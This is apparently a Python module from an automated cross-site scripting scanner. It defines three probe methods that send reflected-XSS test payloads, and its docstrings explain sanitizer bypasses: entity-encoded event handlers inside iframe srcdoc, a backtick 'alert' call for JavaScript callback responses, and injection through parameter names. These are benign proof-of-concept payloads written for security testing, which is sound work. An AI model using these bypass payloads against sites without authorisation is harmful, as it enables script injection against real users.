# -*- coding: utf-8 -*-
"""Phase 364 reflection-shape probes, split out of scanner.py (Phase 371).

Pure movement: every method body below is byte-identical to its former home
in ``scanner.py:1712-1881``.  No logic changed and no call site changed --
``Scanner`` gains this Mixin so its three ``self._try_*`` calls keep
resolving through the composed class.  Splitting rather than raising the
line budget keeps ``test_architecture_scale`` an instrument, not a formality.
"""
from __future__ import annotations

import re
import secrets

from . import reflection_profile as rp_mod
from . import verifier
from .budget import BudgetExhausted, CircuitOpen


class ShapesMixin:
    """Three tightly-gated shape variants for the reflected-XSS probe."""

    def _try_srcdoc_bypass(self, req, url, method, params, data, param,
                           is_body, context):
        """Phase 364: entity-spelled handler inside iframe[srcdoc].

        A sanitizer that deletes the literal ``on*=`` token misses
        ``on&#101;rror=``; the outer document decodes the entity while
        parsing the srcdoc attribute VALUE and then parses the result as a
        document, so the handler is live (measured XSSMaze
        html5-sanitizer/level2).  One request, GET HTML reflection only,
        same verifier as every other reflection.
        """
        cands, _ = self._build_candidates("html_element", False)
        seed = None
        for base in cands:
            pl = base.get("payload") if isinstance(base, dict) else None
            # The seed is embedded in a double-quoted srcdoc attribute, so a
            # payload carrying its own '"' would break the wrapper.
            if (pl and '"' not in pl
                    and re.search(r"\bon[a-z]{2,}\s*=", pl, re.I)):
                seed = pl
                break
        if not seed:
            return False
        token = "xssv_" + secrets.token_hex(4)
        enc = rp_mod.entity_spell_handler(seed)
        if enc == seed:
            return False
        payload = '<iframe srcdoc="%s">' % enc
        marked = verifier.mark(payload, token)
        if marked == payload:
            return False
        send = self._set_param(params, data, param, marked, is_body)
        send_params, send_data = self._skip_filtered(
            send["params"], send["data"])
        try:
            r = req.request(method, url, params=send_params, data=send_data)
            self._bump()
            self.coverage.record_request(url, method)
        except (BudgetExhausted, CircuitOpen):
            raise
        except Exception:
            return False
        try:
            v = verifier.verify_semantic(
                r.text or "", token, response_headers=dict(r.headers))
        except Exception:
            return False
        if not v.get("confirmed"):
            return False
        self.coverage.touch_layer(url, "L1_srcdoc_entity", method,
                                  detail="entity-spelled handler in srcdoc")
        self._record(req, url, method, param, is_body, "reflected",
                     v.get("context") or context, marked,
                     ["srcdoc_entity"], v, r, token)
        return True

    def _try_js_callback(self, req, url, method, params, data, param,
                         is_body, resp):
        """Phase 364: one backtick-call probe for a JavaScript response.

        XSSMaze callback/level2 serves ``application/javascript`` and echoes
        the callback verbatim: ``<script>alert(1)</script>`` comes back as
        ``alert1</script>(...)`` -- the server strips the parentheses, so the
        HTML corpus cannot fire there.  ``alert``1``//`` survives intact and
        is a real dialog call.  Cost: one request, gated on the script media
        type, and the verifier only confirms a short JS body carrying a
        dialog call with our token.
        """
        try:
            ctype = (resp.headers.get("Content-Type") or "").lower()
        except Exception:
            ctype = ""
        if not verifier.is_javascript_media_type(ctype):
            return False
        token = "xssv_" + secrets.token_hex(4)
        payload = "alert`1`//"
        marked = verifier.mark(payload, token)
        if marked == payload:
            return False
        send = self._set_param(params, data, param, marked, is_body)
        send_params, send_data = self._skip_filtered(
            send["params"], send["data"])
        try:
            r = req.request(method, url, params=send_params, data=send_data)
            self._bump()
            self.coverage.record_request(url, method)
        except (BudgetExhausted, CircuitOpen):
            raise
        except Exception:
            return False
        try:
            v = verifier.verify_semantic(
                r.text or "", token, response_headers=dict(r.headers))
        except Exception:
            return False
        if not v.get("confirmed"):
            return False
        self.coverage.touch_layer(url, "L1_js_callback", method,
                                  detail="JavaScript response echoed input")
        self._record(req, url, method, param, is_body, "reflected",
                     v.get("context") or "script_block", marked,
                     ["js_callback"], v, r, token)
        return True

    def _try_param_name_injection(self, req, url, method, params, data,
                                  param, is_body, resp):
        """Phase 364: inject into the parameter NAME, not its value.

        XSSMaze realworld/level5 renders ``Parameters: <name>`` -- the value
        is never echoed, so every value-only probe reads "not reflected" and
        the parameter is abandoned although the page is exploitable.  The
        channel is tightly gated: GET query only, an HTML response no larger
        than 400 bytes that literally mentions this parameter's name (the
        tiny echo page that lists parameter names).  At most two payloads,
        each verified by the same semantic chain as every other reflection.

        Measured 2026-11-06: ``?<svg onload=alert(1)>=x`` reflects the name
        verbatim inside ``<div>Parameters: ...</div>`` and the verifier
        confirms an event handler sink.
        """
        if is_body or str(method).upper() != "GET":
            return False
        text = getattr(resp, "text", "") or ""
        if not text or len(text) > 400 or not param or param not in text:
            return False
        try:
            ctype = (resp.headers.get("Content-Type") or "").lower()
        except Exception:
            ctype = ""
        if ctype and "text/html" not in ctype and "application/xhtml" not in ctype:
            return False
        cands, _ = self._build_candidates("html_element", False)
        tries = 0
        for base in cands:
            if tries >= 2:
                break
            payload = base.get("payload") if isinstance(base, dict) else None
            if not payload or not verifier.has_execution_point(payload):
                continue
            token = "xssv_" + secrets.token_hex(4)
            marked = verifier.mark(payload, token)
            if marked == payload:
                continue
            tries += 1
            pairs = [(k, v) for k, v in (params or {}).items() if k != param]
            pairs.append((marked, "xssprobe"))
            send = self._skip_filtered(dict(pairs), data)
            try:
                r = req.request(method, url, params=list(send[0].items()),
                                data=send[1])
                self._bump()
                self.coverage.record_request(url, method)
            except (BudgetExhausted, CircuitOpen):
                raise
            except Exception:
                continue
            try:
                v = verifier.verify_semantic(
                    r.text or "", token, response_headers=dict(r.headers))
            except Exception:
                continue
            if not v.get("confirmed"):
                continue
            self.coverage.touch_layer(url, "L1_param_name", method,
                                      detail="parameter NAME reflected")
            self._record(req, url, method, marked, is_body, "reflected",
                         v.get("context") or "html_element", marked,
                         ["param_name"], v, r, token)
            return True
        return False

